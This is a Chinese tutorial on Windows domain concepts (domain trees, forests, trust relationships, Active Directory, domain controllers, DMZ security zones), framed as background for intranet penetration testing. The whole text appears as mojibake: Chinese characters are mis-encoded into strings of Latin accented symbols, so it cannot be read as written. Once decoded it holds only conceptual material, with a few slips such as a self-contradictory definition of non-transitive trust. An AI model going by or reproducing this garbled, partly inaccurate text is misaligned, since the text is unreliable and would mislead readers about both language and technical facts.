å¦‚æœæŠŠä¸åŒåœ°ç†ä½ç½®çš„åˆ†å…¬å¸æ”¾åœ¨åŒä¸€ä¸ªåŸŸå†…ï¼Œé‚£ä¹ˆä»–ä»¬ä¹‹é—´ä¿¡æ¯äº¤äº’ï¼ˆåŒ…æ‹¬åŒæ­¥ï¼Œå¤åˆ¶ç­‰ï¼‰æ‰€èŠ±è´¹çš„æ—¶é—´ä¼šæ¯”è¾ƒé•¿ï¼Œè€Œä¸”å ç”¨çš„å¸¦å®½ä¹Ÿæ¯”è¾ƒå¤§ã€‚ï¼ˆå› ä¸ºåœ¨åŒä¸€ä¸ªåŸŸå†…ï¼Œä¿¡æ¯äº¤äº’çš„æ¡ç›®æ˜¯å¾ˆå¤šçš„ï¼Œè€Œä¸”ä¸å‹ç¼©ï¼›è€Œåœ¨åŸŸå’ŒåŸŸä¹‹é—´ï¼Œä¿¡æ¯äº¤äº’çš„æ¡ç›®ç›¸å¯¹è¾ƒå°‘ï¼Œè€Œä¸”å‹ç¼©ã€‚ï¼‰ è¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œå°±æ˜¯å­å…¬å¸å¯ä»¥é€šè¿‡è‡ªå·±çš„åŸŸæ¥ç®¡ç†è‡ªå·±çš„èµ„æºã€‚å°†å¯¹åº”éƒ¨é—¨è§„åˆ’ä¸ºä¸€ä¸ªåŸŸï¼Œå…¬å¸åˆ™æ˜¯ä¸€ä¸ªåŸŸæ ‘ã€‚ è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯å‡ºäºå®‰å…¨ç­–ç•¥çš„è€ƒè™‘ï¼Œå› ä¸ºæ¯ä¸ªåŸŸéƒ½æœ‰è‡ªå·±ç‹¬æœ‰çš„å®‰å…¨ç­–ç•¥ã€‚æ¯”å¦‚ä¸€ä¸ªå…¬å¸çš„è´¢åŠ¡éƒ¨é—¨å¸Œæœ›èƒ½ä½¿ç”¨ç‰¹å®šçš„å®‰å…¨ç­–ç•¥ï¼ˆåŒ…æ‹¬å¸å·å¯†ç ç­–ç•¥ç­‰ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥å°†è´¢åŠ¡éƒ¨é—¨åšæˆä¸€ä¸ªå­åŸŸæ¥å•ç‹¬ç®¡ç†ã€‚ 2.3åŸŸæ ‘åŸŸæ ‘æŒ‡è‹¥å¹²ä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚ä¸€ä¸ªåŸŸç®¡ç†å‘˜åªèƒ½ç®¡ç†æœ¬åŸŸçš„å†…éƒ¨ï¼Œä¸èƒ½è®¿é—®æˆ–è€…ç®¡ç†å…¶ä»–çš„åŸŸï¼ŒäºŒä¸ªåŸŸä¹‹é—´ç›¸äº’è®¿é—®åˆ™éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»ï¼ˆTrust Relationï¼‰ã€‚æ¯”å¦‚asia.abc.comä¸Europe.abc.comè®¿é—®éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³» ä¿¡ä»»å…³ç³»æ˜¯è¿æ¥åœ¨åŸŸä¸åŸŸä¹‹é—´çš„æ¡¥æ¢ã€‚åŸŸæ ‘å†…çš„çˆ¶åŸŸä¸å­åŸŸä¹‹é—´ä¸ä½†å¯ä»¥æŒ‰éœ€è¦ç›¸äº’è¿›è¡Œç®¡ç†ï¼Œè¿˜å¯ä»¥è·¨ç½‘åˆ†é…æ–‡ä»¶å’Œæ‰“å°æœºç­‰è®¾å¤‡èµ„æºï¼Œä½¿ä¸åŒçš„åŸŸä¹‹é—´å®ç°ç½‘ç»œèµ„æºçš„å…±äº«ä¸ç®¡ç†ï¼Œä»¥åŠç›¸äº’é€šä¿¡å’Œæ•°æ®ä¼ è¾“ã€‚ åœ¨ä¸€ä¸ªåŸŸæ ‘ä¸­ï¼Œçˆ¶åŸŸå¯ä»¥åŒ…å«å¾ˆå¤šå­åŸŸï¼Œå­åŸŸæ˜¯ç›¸å¯¹çˆ¶åŸŸæ¥è¯´çš„ï¼ŒæŒ‡åŸŸåä¸­çš„æ¯ä¸€ä¸ªæ®µã€‚å­åŸŸåªèƒ½ä½¿ç”¨çˆ¶åŸŸä½œä¸ºåŸŸåçš„åç¼€ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ä¸€ä¸ªåŸŸæ ‘ä¸­ï¼ŒåŸŸçš„åå­—æ˜¯è¿ç»­çš„ 2.4 åŸŸæ£®æ—åŸŸæ£®æ—æŒ‡è‹¥å¹²ä¸ª åŸŸæ ‘ é€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚å¯ä»¥é€šè¿‡åŸŸæ ‘ä¹‹é—´å»ºç«‹çš„ä¿¡ä»»å…³ç³»æ¥ç®¡ç†å’Œä½¿ç”¨æ•´ä¸ªæ£®æ—ä¸­çš„èµ„æºï¼Œä»è€Œåˆä¿æŒäº†åŸæœ‰åŸŸè‡ªèº«åŸæœ‰çš„ç‰¹æ€§ã€‚æ¯”å¦‚ï¼šè¿™é‡ŒåŸŸæ ‘abc.comä¸åŸŸæ ‘abc.netä¹‹é—´é€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»æ¥æ„æˆåŸŸæ£®æ— è¿™ç§ä¿¡ä»»å…³ç³»æ˜¯å•å‘ æˆ–è€… ä¸å¯ä¼ é€’çš„ ä¹Ÿå«å¤–éƒ¨ä¿¡ä»» 2.5 DNSåŸŸåæœåŠ¡å™¨(Domain Name Server)DNSåŸŸåæœåŠ¡å™¨æ˜¯è¿›è¡ŒåŸŸåï¼ˆdomain nameï¼‰å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€ï¼ˆIP addressï¼‰è½¬æ¢çš„æœåŠ¡å™¨ã€‚ åœ¨åŸŸæ ‘çš„ä»‹ç»ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åŸŸæ ‘ä¸­çš„åŸŸçš„åå­—å’ŒDNSåŸŸçš„åå­—éå¸¸ç›¸ä¼¼ï¼Œå®é™…ä¸ŠåŸŸçš„åå­—å°±æ˜¯DNSåŸŸçš„åå­—ï¼Œå› ä¸ºåŸŸä¸­çš„è®¡ç®—æœºä½¿ç”¨DNSæ¥å®šä½åŸŸæ§åˆ¶å™¨å’ŒæœåŠ¡å™¨ä»¥åŠå…¶ä»–è®¡ç®—æœºã€ç½‘ç»œæœåŠ¡ç­‰ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åœ¨å†…ç½‘æ¸—é€æ—¶å°±é€šè¿‡ å¯»æ‰¾DNSæœåŠ¡å™¨æ¥å®šä½åŸŸæ§åˆ¶å™¨ï¼Œå› ä¸ºé€šå¸¸DNSæœåŠ¡å™¨å’ŒåŸŸæ§åˆ¶å™¨ä¼šå¤„åœ¨åŒä¸€å°æœºå™¨ä¸Šã€‚ 3. åŸŸä¿¡ä»»å…³ç³»ä¿¡ä»»å…³ç³»çš„æ¦‚å¿µåŸŸï¼ˆDomainï¼‰æ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼Œè‹¥æ— ä¿¡ä»»å…³ç³»ï¼Œåˆ™åŸŸè´¦æˆ·åªèƒ½åœ¨æœ¬åŸŸå†…ä½¿ç”¨ã€‚ è€Œä¿¡ä»»å…³ç³»æ˜¯ä¸¤ä¸ªåŸŸä¹‹é—´çš„æ¡¥æ¢ï¼Œä½¿å¾—åŸŸç”¨æˆ·è´¦æˆ·ä¹‹é—´å¯ä»¥ç›¸äº’è®¿é—®ã€‚ ä¿¡ä»»å…³ç³»ä½¿ä¸€ä¸ªåŸŸçš„DCå¯ä»¥éªŒè¯å…¶ä»–åŸŸçš„ç”¨æˆ·ï¼Œè€Œè¿™ç§èº«ä»½éªŒè¯éœ€è¦ä¿¡ä»»è·¯å¾„ã€‚ä¾‹å¦‚ï¼šAåŸŸä¸BåŸŸæ²¡æœ‰ä¿¡ä»»å…³ç³»ï¼ŒAåŸŸä¸Šçš„å‘˜å·¥ä½¿ç”¨è‡ªå·±åœ¨AåŸŸçš„å¸æˆ·ï¼Œå°† ä¸èƒ½è®¿é—®BåŸŸä¸Šçš„èµ„æºã€‚å³ ä¸¤ä¸ªåŸŸä¹‹é—´åªæœ‰å»ºç«‹é€‚å½“çš„ä¿¡ä»»å…³ç³»åæ‰å¯ä»¥å®ç°äº’ç›¸è®¿é—® ä¿¡ä»»å…³ç³»åˆ†ä¸ºï¼šå¯ä¼ é€’å’Œä¸å¯ä¼ é€’çš„ã€‚ æ˜¯äººä¸ºå¯ä»¥è®¾ç½®çš„ å¯ä¼ é€’ï¼šå¦‚æœAåŸŸå’ŒBåŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³»æ˜¯å¯ä¼ é€’çš„ï¼ŒBåŸŸå’ŒCåŸŸä¹‹é—´çš„ä¿¡ä»»ä¹Ÿæ˜¯å¯ä¼ é€’çš„ï¼Œé‚£ä¹ˆAåŸŸå’ŒCåŸŸä¹‹é—´å°±ä¼šè‡ªåŠ¨åˆ›å»ºä¿¡ä»»å…³ç³» ä¸å¯ä¼ é€’ï¼šå¦‚æœAåŸŸå’ŒBåŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³»æ˜¯ä¸å¯ä¼ é€’çš„ï¼Œæˆ– BåŸŸå’ŒCåŸŸä¹‹é—´çš„ä¿¡ä»»ä¹Ÿæ˜¯å¯ä¼ é€’çš„ï¼Œé‚£ä¹ˆAåŸŸå’ŒCåŸŸä¹‹é—´å°±ä¸ä¼šè‡ªåŠ¨åˆ›å»ºä¿¡ä»»å…³ç³» å•å‘ä¿¡ä»»å…³ç³»ä¿¡ä»»æ˜¯æœ‰æ–¹å‘çš„ï¼Œä¿¡ä»»çš„æ–¹å‘å†³å®šäº†èµ„æºè®¿é—®çš„æ–¹å‘ å•å‘ä¿¡ä»»æ˜¯åœ¨ä¸¤ä¸ªåŸŸä¹‹é—´åˆ›å»ºçš„å•å‘ä¿¡ä»»ã€‚è¡¨æ˜ AåŸŸåœ¨ ä¸ BåŸŸçš„å•å‘ä¿¡ä»»ä¸­ï¼ŒAåŸŸä¸­çš„ç”¨æˆ·å¯ä»¥è®¿é—®BåŸŸä¸­çš„èµ„æºï¼Œè€ŒBåŸŸä¸­çš„ç”¨æˆ·æ— æ³•è®¿é—®AåŸŸä¸­çš„èµ„æº åŒå‘ä¿¡ä»»å…³ç³»åŸŸæ ‘ ä¸­çš„æ‰€æœ‰åŸŸä¿¡ä»»å…³ç³»éƒ½æ˜¯åŒå‘çš„ã€å¯ä¼ é€’çš„ä¿¡ä»»ã€‚åˆ›å»ºæ–°çš„å­åŸŸæ—¶ï¼Œç³»ç»Ÿä¼šåœ¨æ–°çš„å­åŸŸå’Œçˆ¶åŸŸä¹‹é—´è‡ªåŠ¨åˆ›å»ºåŒå‘å¯ä¼ é€’çš„ä¿¡ä»»å…³ç³»ã€‚ åœ¨åŒå‘ä¿¡ä»»ä¸­ï¼ŒAåŸŸ ä¿¡ä»» BåŸŸï¼Œå¹¶ä¸” BåŸŸä¿¡ä»» AåŸŸ/è¿™è¡¨æ˜å¯ä»¥åœ¨ä¸¤ä¸ªåŸŸä¹‹é—´åŒå‘ä¼ é€’èº«ä»½éªŒè¯è¯·æ±‚ã€‚ å†…å¤–éƒ¨ä¿¡ä»»å…³ç³»å†…éƒ¨ä¿¡ä»»æ˜¯æŒ‡åŒä¸€ä¸ªåŸŸæ ‘ä¹‹é—´çš„ä¿¡ä»»å…³ç³»ï¼Œè¿™ç§å…³ç³»æ˜¯å¯ä¼ é€’çš„ è€Œå¤–éƒ¨ä¿¡ä»» æ¯”å¦‚æ–°çš„ abc.net åŸŸæ ‘è¦åŠ å…¥åˆ° abc.com è¦å»ºç«‹ä¸€ä¸ªå•å‘ã€æˆ–åŒå‘ä¿¡ä»»å…³ç³» å–å†³äºè®¾ç½® ä½†æ˜¯è¿™ä¸ªä¿¡ä»»å…³ç³»æ˜¯ä¸èƒ½ä¼ é€’çš„ï¼Œå³å¯abc.com å’Œ abc.net åŒå‘ä¿¡ä»»ï¼Œä½† abc.com æƒ³è¦è®¿é—® test.abc.net æ˜¯ä¸è¡Œçš„ è¿™ç§ä¿¡ä»»å…³ç³»æ˜¯å•å‘ æˆ–è€… ä¸å¯ä¼ é€’çš„ ä¹Ÿå«å¤–éƒ¨ä¿¡ä»» (3) æ´»åŠ¨ç›®å½•1. æ¦‚å¿µæ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼Œå³ADï¼‰æ˜¯åŸŸç¯å¢ƒä¸­æä¾›ç›®å½•æœåŠ¡çš„ç»„ä»¶ã€‚ ç›®å½•æ˜¯ä»€ä¹ˆï¼Ÿ ç›®å½•å°±æ˜¯å­˜å‚¨æœ‰å…³ç½‘ç»œå¯¹è±¡ï¼ˆå¦‚ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€å…±äº«èµ„æºã€æ‰“å°æœºå’Œè”ç³»äººç­‰ï¼‰çš„ä¿¡æ¯ã€‚ç›®å½•æœåŠ¡æ˜¯å¸®åŠ©ç”¨æˆ·å¿«é€Ÿå‡†ç¡®çš„ä»ç›®å½•ä¸­æŸ¥æ‰¾åˆ°ä»–æ‰€éœ€è¦çš„ä¿¡æ¯çš„æœåŠ¡ã€‚ å¦‚æœå°†ä¼ä¸šçš„å†…ç½‘çœ‹æˆæ˜¯ä¸€æœ¬å­—å…¸ï¼Œé‚£ä¹ˆå†…ç½‘é‡Œçš„èµ„æºå°±æ˜¯å­—å…¸çš„å†…å®¹ï¼Œæ´»åŠ¨ç›®å½•å°±ç›¸å½“äºå­—å…¸çš„ç´¢å¼•ã€‚å³æ´»åŠ¨ç›®å½•å­˜å‚¨çš„æ˜¯ç½‘ç»œä¸­æ‰€æœ‰èµ„æºçš„å¿«æ·æ–¹å¼ï¼Œç”¨æˆ·é€šè¿‡å¯»æ‰¾å¿«æ·æ–¹å¼è€Œå®šä½èµ„æºã€‚ 2.é€»è¾‘ç»“æ„ åœ¨æ´»åŠ¨ç›®å½•ä¸­ï¼Œç®¡ç†å‘˜å¯ä»¥å®Œå…¨å¿½ç•¥è¢«ç®¡ç†å¯¹è±¡çš„å…·ä½“åœ°ç†ä½ç½®ï¼Œè€Œå°†è¿™äº›å¯¹è±¡æŒ‰ç…§ä¸€å®šçš„æ–¹å¼æ”¾ç½®åœ¨ä¸åŒçš„å®¹å™¨ä¸­ã€‚ç”±äºè¿™ç§ç»„ç»‡å¯¹è±¡çš„åšæ³•ä¸è€ƒè™‘è¢«ç®¡ç†å¯¹è±¡çš„å…·ä½“åœ°ç†ä½ç½®ï¼Œè¿™ç§ç»„ç»‡æ¡†æ¶ç§°ä¸ºâ€œé€»è¾‘ç»“æ„â€œã€‚ æ´»åŠ¨ç›®å½•çš„é€»è¾‘ç»“æ„å°±åŒ…æ‹¬ä¸Šé¢è®²åˆ°çš„ç»„ç»‡å•å…ƒï¼ˆOUï¼‰ã€åŸŸï¼ˆdomainï¼‰ã€åŸŸæ ‘ï¼ˆtreeï¼‰ã€åŸŸæ£®æ—ï¼ˆforestï¼‰ã€‚åœ¨åŸŸæ ‘å†…çš„æ‰€æœ‰åŸŸå…±äº«ä¸€ä¸ªæ´»åŠ¨ç›®å½•ï¼Œè¿™ä¸ªæ´»åŠ¨ç›®å½•å†…çš„æ•°æ®åˆ†æ•£åœ°å­˜å‚¨åœ¨å„ä¸ªåŸŸå†…ï¼Œä¸”æ¯ä¸€ä¸ªåŸŸåªå­˜å‚¨è¯¥åŸŸå†…çš„æ•°æ®ã€‚ ä¾‹ï¼šAé›†å›¢ä¸‹æœ‰ç”² ä¹™ ä¸™ä¸‰å®¶å­å…¬å¸ï¼Œä¸ºäº†Aé›†å›¢æ›´å¥½çš„ç®¡ç†è¿™ä¸‰å®¶å…¬å¸ï¼Œå¯ä»¥å°†è¿™ä¸‰å®¶å…¬å¸çš„åŸŸæ ‘é›†ä¸­èµ·æ¥ç»„æˆåŸŸæ£®æ—ã€‚Aé›†å›¢å¯ä»¥æŒ‰ç…§ â€œAé›†å›¢ï¼ˆåŸŸæ£®æ—ï¼‰-&gt;å­å…¬å¸ï¼ˆåŸŸæ ‘ï¼‰-&gt;éƒ¨é—¨ï¼ˆåŸŸï¼‰-&gt;å‘˜å·¥â€ çš„æ–¹å¼å¯¹ç½‘ç»œè¿›è¡Œå±‚æ¬¡åˆ†æ˜çš„ç®¡ç†ã€‚å¯ä»¥ä½¿ä¼ä¸šç½‘ç»œå…·æœ‰è¾ƒå¼ºçš„å¯æ‰©å±•æ€§ï¼Œä¾¿äºè¿›è¡Œç»„ç»‡ã€ç®¡ç†åŠç›®å½•å®šä½ã€‚ 3.æ´»åŠ¨ç›®å½•(AD)ä¸»è¦åŠŸèƒ½ å¸å·é›†ä¸­ç®¡ç†ï¼Œæ‰€æœ‰å¸å·å‡å­˜åœ¨æœåŠ¡å™¨ä¸Šï¼Œæ–¹ä¾¿å¯¹å¸å·çš„é‡å‘½ä»¤/é‡ç½®å¯†ç ã€‚ è½¯ä»¶é›†ä¸­ç®¡ç†ï¼Œç»Ÿä¸€æ¨é€è½¯ä»¶ï¼Œç»Ÿä¸€å®‰è£…ç½‘ç»œæ‰“å°æœºç­‰ã€‚åˆ©ç”¨è½¯ä»¶å‘å¸ƒç­–ç•¥åˆ†å‘è½¯ä»¶ï¼Œå¯ä»¥è®©ç”¨æˆ·è‡ªç”±é€‰æ‹©å®‰è£…è½¯ä»¶ã€‚ ç¯å¢ƒé›†ä¸­ç®¡ç†ï¼Œåˆ©ç”¨ADå¯ä»¥ç»Ÿä¸€å®¢æˆ·ç«¯æ¡Œé¢ï¼ŒIEï¼ŒTCP/IPç­‰è®¾ç½®ã€‚ å¢å¼ºå®‰å…¨æ€§ï¼Œç»Ÿä¸€éƒ¨ç½²æ€æ¯’è½¯ä»¶å’Œæ‰«æ¯’ä»»åŠ¡ï¼Œé›†ä¸­åŒ–ç®¡ç†ç”¨æˆ·çš„è®¡ç®—æœºæƒé™ã€ç»Ÿä¸€åˆ¶è®¢ç”¨æˆ·å¯†ç ç­–ç•¥ç­‰ï¼Œå¯ç›‘æ§ç½‘ç»œï¼Œèµ„æ–™ç»Ÿä¸€ç®¡ç†ã€‚ æ›´å¯é ï¼Œæ›´å°‘çš„å®•æœºæ—¶é—´ã€‚å¦‚ï¼šåˆ©ç”¨ADæ§åˆ¶ç”¨æˆ·è®¿é—®æƒé™ï¼Œåˆ©ç”¨ç¾¤é›†ã€è´Ÿè½½å‡è¡¡ç­‰æŠ€æœ¯å¯¹æ–‡ä»¶æœåŠ¡å™¨è¿›è¡Œå®¹ç¾è®¾å®šï¼Œæ›´å¯é ï¼Œå²©æœºæ—¶é—´æ›´å°‘ã€‚ æ´»åŠ¨ç›®å½•ä¸ºMicrosoftç»Ÿä¸€ç®¡ç†çš„åŸºç¡€å¹³å°ï¼Œå…¶å®ƒisaï¼Œexchangeï¼Œsmsç­‰æœåŠ¡éƒ½ä¾èµ–äºè¿™ä¸ªåŸºç¡€å¹³å°ã€‚ 4. DCå’ŒADçš„åŒºåˆ«ã€è”ç³» å¦‚æœç½‘ç»œè§„æ¨¡è¾ƒå¤§ï¼Œæˆ‘ä»¬å°±ä¼šè€ƒè™‘æŠŠç½‘ç»œä¸­çš„ä¼—å¤šå¯¹è±¡ï¼šè®¡ç®—æœºã€ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€æ‰“å°æœºã€å…±äº«æ–‡ä»¶ç­‰ï¼Œåˆ†é—¨åˆ«ç±»ã€äº•ç„¶æœ‰åºåœ°æ”¾åœ¨ä¸€ä¸ªå¤§ä»“åº“ä¸­ï¼Œå¹¶åšå¥½æ£€ç´¢ä¿¡æ¯ï¼Œä»¥åˆ©äºæŸ¥æ‰¾ã€ç®¡ç†å’Œä½¿ç”¨è¿™äº›å¯¹è±¡ï¼ˆèµ„æºï¼‰ã€‚è¿™ä¸ªæœ‰å±‚æ¬¡ç»“æ„çš„æ•°æ®åº“ï¼Œå°±æ˜¯æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œç®€ç§°ADåº“ã€‚ é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æŠŠè¿™ä¸ªæ•°æ®åº“æ”¾åœ¨å“ªå°è®¡ç®—æœºä¸Šå‘¢ï¼Ÿè§„å®šæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬æŠŠå­˜æ”¾æœ‰æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„è®¡ç®—æœºå°±ç§°ä¸ºDCã€‚ æ‰€ä»¥è¯´æˆ‘ä»¬è¦å®ç° åŸŸç¯å¢ƒï¼Œå…¶å®å°±æ˜¯è¦å®‰è£…ADï¼Œå½“å†…ç½‘ä¸­çš„ä¸€å°è®¡ç®—æœºå®‰è£…äº†ADåï¼Œå®ƒå°±å˜æˆäº†DCã€‚ DCçš„æœ¬è´¨æ˜¯ä¸€å°è®¡ç®—æœºï¼ŒADçš„æœ¬è´¨æ˜¯æä¾›ç›®å½•æœåŠ¡çš„ç»„ä»¶ 5. å‰é¢çš„å·¥ä½œç»„ç¯å¢ƒâ€é—®é¢˜-è§£å†³å›é¡¾ä¸€ä¸‹ä¹‹å‰çš„é—®é¢˜ï¼š å‡å¦‚ä¸€ä¸ªå…¬å¸æœ‰200å°ç”µè„‘ï¼Œæˆ‘ä»¬å¸Œæœ›æŸå°ç”µè„‘ä¸Šçš„è´¦æˆ·Alanå¯ä»¥è®¿é—®æ¯å°ç”µè„‘å†…çš„èµ„æºæˆ–è€…å¯ä»¥åœ¨æ¯å°ç”µè„‘ä¸Šç™»å½•ã€‚é‚£ä¹ˆåœ¨â€å·¥ä½œç»„â€ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¿…é¡»è¦åœ¨è¿™200å°ç”µè„‘çš„å„ä¸ªSAMæ•°æ®åº“ä¸­åˆ›å»ºAlanè¿™ä¸ªè´¦æˆ·ã€‚ä¸€æ—¦Alanæƒ³è¦æ›´æ¢å¯†ç ï¼Œå¿…é¡»è¦æ›´æ”¹200æ¬¡ï¼ç°åœ¨åªæ˜¯200å°ç”µè„‘çš„å…¬å¸ï¼Œå¦‚æœæ˜¯æœ‰5000å°ç”µè„‘æˆ–è€…ä¸Šä¸‡å°ç”µè„‘çš„å…¬å¸å‘¢ï¼Ÿ ç­”æ¡ˆï¼š åœ¨åŸŸç¯å¢ƒä¸­ï¼Œåªéœ€è¦åœ¨æ´»åŠ¨ç›®å½•ä¸­åˆ›å»ºä¸€æ¬¡Alanè´¦æˆ·ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨ä»»æ„200å°ç”µè„‘ä¸­çš„ä¸€å°ä¸Šç™»å½•Alanï¼Œå¦‚æœè¦ä¸ºAlanè´¦æˆ·æ›´æ”¹å¯†ç ï¼Œåªéœ€è¦åœ¨æ´»åŠ¨ç›®å½•ä¸­æ›´æ”¹ä¸€æ¬¡å°±å¯ä»¥äº†ã€‚ å­¦äº†åŸŸä¹‹åï¼Œè¿™ä¸ªé—®é¢˜è§£å†³æ˜¯ä¸æ˜¯å°±å¾ˆç®€å•å‘¢ï¼Œå½“ç„¶è¿™åªæ˜¯åŸŸçš„ä¸€ä¸ªå¾ˆåŸºç¡€çš„åŠŸèƒ½ã€‚ (4) åŸŸç›¸å…³æ¦‚å¿µ1. å®‰å…¨åŸŸåˆ’åˆ†å®‰å…¨åŸŸåˆ’åˆ†çš„ç›®çš„æ˜¯å°†ä¸€ç»„å®‰å…¨ç­‰çº§ç›¸åŒçš„è®¡ç®—æœºåˆ’å…¥åŒä¸€ä¸ªç½‘æ®µå†…ï¼Œè¿™ä¸€ç½‘æ®µå†…çš„è®¡ç®—æœºæ‹¥æœ‰ç›¸åŒçš„ç½‘ç»œè¾¹ç•Œï¼Œåœ¨ç½‘ç»œè¾¹ç•Œä¸Šé‡‡ç”¨é˜²ç«å¢™éƒ¨ç½²æ¥å®ç°å¯¹å…¶ä»–å®‰å…¨åŸŸçš„ NACLï¼ˆç½‘ç»œè®¿é—®æ§åˆ¶ç­–ç•¥ï¼‰ï¼Œå…è®¸å“ªäº›IPè®¿é—®æ­¤åŸŸã€ä¸å…è®¸å“ªäº›è®¿é—®æ­¤åŸŸï¼›å…è®¸æ­¤åŸŸè®¿é—®å“ªäº›IP/ç½‘æ®µã€ä¸å…è®¸è®¿é—®å“ªäº›IP/ç½‘æ®µã€‚ä½¿å¾—å…¶é£é™©æœ€å°åŒ–ï¼Œå½“å‘ç”Ÿæ”»å‡»æ—¶å¯ä»¥å°†å¨èƒæœ€å¤§åŒ–çš„éš”ç¦»ï¼Œå‡å°‘å¯¹åŸŸå†…è®¡ç®—æœºçš„å½±å“ã€‚ å†…ç½‘å®‰å…¨ç­–ç•¥çº§åˆ«æœ€é«˜ï¼ŒDMZä¸­ç­‰ï¼Œå¤–ç½‘åˆ™ä½ä¸€ç‚¹ã€‚ ä¸‹å›¾ä¸ºä¸­å°å‹å†…ç½‘çš„å®‰å…¨åŒºåŸŸåˆ’åˆ†ï¼Œä¸€ä¸ªè™šçº¿æ¡†è¡¨ç¤ºä¸€ä¸ªå®‰å…¨åŸŸï¼ˆä¹Ÿæ˜¯ç½‘ç»œçš„è¾¹ç•Œï¼Œä¸€èˆ¬åˆ†ä¸ºDMZå’Œå†…ç½‘ï¼‰ï¼Œé€šè¿‡ç¡¬ä»¶é˜²ç«å¢™çš„ä¸åŒç«¯å£å®ç°éš”ç¦»ã€‚ 2. DMZç½‘ç»œä¸€èˆ¬å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªåŒºåŸŸï¼šå®‰å…¨çº§åˆ«æœ€é«˜çš„å†…ç½‘ï¼›å®‰å…¨çº§åˆ«ä¸­ç­‰çš„DMZï¼›å®‰å…¨çº§åˆ«æœ€ä½çš„å¤–ç½‘ã€‚ä¸‰ä¸ªåŒºåŸŸè´Ÿè´£å®Œæˆä¸åŒä»»åŠ¡ï¼Œå› æ­¤éœ€è¦è®¾ç½®ä¸åŒçš„è®¿é—®ç­–ç•¥ã€‚ å¦‚ä¸Šå›¾ï¼Œä¸¤ä¸ªé˜²ç«å¢™ä¹‹é—´çš„ç©ºé—´è¢«ç§°ä¸ºDMZã€‚ DMZ(demilitarized zone)çš„ç¼©å†™ï¼Œå³â€éš”ç¦»åŒºâ€ï¼Œä¹Ÿç§°â€éå†›äº‹åŒ–åŒºâ€ã€‚ DMZæ˜¯ä¸ºäº†è§£å†³å®‰è£…é˜²ç«å¢™åå¤–éƒ¨ç½‘ç»œçš„è®¿é—®ç”¨æˆ·ä¸èƒ½è®¿é—®å†…éƒ¨ç½‘ç»œæœåŠ¡å™¨çš„é—®é¢˜ï¼Œè€Œè®¾ç«‹çš„ä¸€ä¸ªéå®‰å…¨ç³»ç»Ÿä¸å®‰å…¨ç³»ç»Ÿä¹‹é—´çš„ç¼“å†²åŒºã€‚ è¯¥ç¼“å†²åŒºä½äºä¼ä¸šå†…éƒ¨ç½‘ç»œå’Œå¤–éƒ¨ç½‘ç»œä¹‹é—´çš„å°ç½‘ç»œåŒºåŸŸå†…ã€‚åœ¨è¿™ä¸ªå°ç½‘ç»œåŒºåŸŸå†…å¯ä»¥æ”¾ç½®ä¸€äº›å¿…é¡»å…¬å¼€çš„æœåŠ¡å™¨è®¾æ–½ï¼Œå¦‚ä¼ä¸šWebæœåŠ¡å™¨ã€FTPæœåŠ¡å™¨å’Œè®ºå›ç­‰ã€‚ å¦ä¸€æ–¹é¢ï¼Œé€šè¿‡è¿™æ ·ä¸€ä¸ªDMZåŒºåŸŸï¼Œæ›´åŠ æœ‰æ•ˆåœ°ä¿æŠ¤äº†å†…éƒ¨ç½‘ç»œã€‚å› ä¸ºè¿™ç§ç½‘ç»œéƒ¨ç½²ï¼Œæ¯”èµ·ä¸€èˆ¬çš„é˜²ç«å¢™æ–¹æ¡ˆï¼Œå¯¹æ¥è‡ªå¤–ç½‘çš„æ”»å‡»è€…æ¥è¯´åˆå¤šäº†ä¸€é“å…³å¡ 3. DMZå±éšœåŠŸèƒ½é€šè¿‡å®šä¹‰ä¸€äº›è®¿é—®ç­–ç•¥ï¼Œå®ç°DMZåŒºçš„å±éšœåŠŸèƒ½ å†…ç½‘å¯ä»¥è®¿é—®å¤–ç½‘å†…ç½‘çš„ç”¨æˆ·éœ€è¦è‡ªç”±åœ°è®¿é—®å¤–ç½‘ã€‚åœ¨è¿™ä¸€ç­–ç•¥ä¸­ï¼Œé˜²ç«å¢™éœ€è¦æ‰§è¡ŒNATã€‚ å†…ç½‘å¯ä»¥è®¿é—®DMZæ­¤ç­–ç•¥ä½¿å†…ç½‘ç”¨æˆ·å¯ä»¥ä½¿ç”¨æˆ–è€…ç®¡ç†DMZä¸­çš„æœåŠ¡å™¨ã€‚ å¤–ç½‘ä¸èƒ½è®¿é—®å†…ç½‘è¿™æ˜¯é˜²ç«å¢™çš„åŸºæœ¬ç­–ç•¥äº†ï¼Œå†…ç½‘ä¸­å­˜æ”¾çš„æ˜¯å…¬å¸å†…éƒ¨æ•°æ®ï¼Œæ˜¾ç„¶è¿™äº›æ•°æ®æ˜¯ä¸å…è®¸å¤–ç½‘çš„ç”¨æˆ·è¿›è¡Œè®¿é—®çš„ã€‚å¦‚æ —è¦è®¿é—®ï¼Œå°±è¦é€šè¿‡VPNæ–¹å¼æ¥è¿›è¡Œã€‚ æ¯”å¦‚ï¼šæœ€å¸¸è§çš„æ ¡å›­ç½‘ 